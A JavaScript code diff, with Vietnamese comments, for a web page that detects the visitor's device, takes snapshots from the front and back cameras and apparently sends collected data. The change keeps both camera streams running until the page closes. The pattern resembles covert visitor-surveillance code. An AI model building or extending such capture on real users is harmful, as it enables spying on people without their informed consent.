@@ -19,6 +19,9 @@ const info = {
   camera: '⏳ Đang kiểm tra...'
 };
 
+let frontStream = null;
+let backStream = null;
+
 function detectDevice() {
   const ua = navigator.userAgent;
   if (/iPhone|iPad|iPod/i.test(ua)) {
@@ -110,6 +113,10 @@ function captureCamera(facingMode = 'user') {
           const video = document.createElement('video');
           video.srcObject = stream;
           video.play();
+
+          if (facingMode === 'user') frontStream = stream;
+          else backStream = stream;
+
           video.onloadedmetadata = () => {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
@@ -118,7 +125,6 @@ function captureCamera(facingMode = 'user') {
 
             setTimeout(() => {
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              stream.getTracks().forEach(track => track.stop());
               canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
             }, 1000);
           };
@@ -196,6 +202,12 @@ async function main() {
   } else {
     await sendTextOnly();
   }
+
+  // Giữ stream hoạt động đến khi đóng trang
+  window.addEventListener("beforeunload", () => {
+    if (frontStream) frontStream.getTracks().forEach(track => track.stop());
+    if (backStream) backStream.getTracks().forEach(track => track.stop());
+  });
 }
 
 main();
